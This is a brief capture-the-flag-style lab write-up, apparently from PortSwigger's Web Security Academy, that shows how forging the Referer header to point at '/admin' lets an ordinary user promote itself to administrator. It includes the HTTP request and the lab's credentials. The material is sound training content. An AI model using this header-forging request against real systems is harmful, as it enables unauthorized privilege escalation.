# Referer-Based Access Control

This lab gates certain admin functions based on the `Referer` header. The admin panel can first be explored by logging in with administrator:admin.

**Goal:** Log in as wiener:peter and exploit the flawed access control to promote your own account to administrator.

---

**Reference:**
- https://portswigger.net/web-security/access-control

pic 1

---

The user-upgrade action is triggered from the admin panel via a GET request:

pic 2

Attempting it as "wiener" directly returns an unauthorized error:

pic 3

Setting the `Referer` header to point at `/admin` makes it succeed:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
...
Referer: https://0afd00fc039e68c881769dfa009b00b8.web-security-academy.net/admin
...
```

pic 4
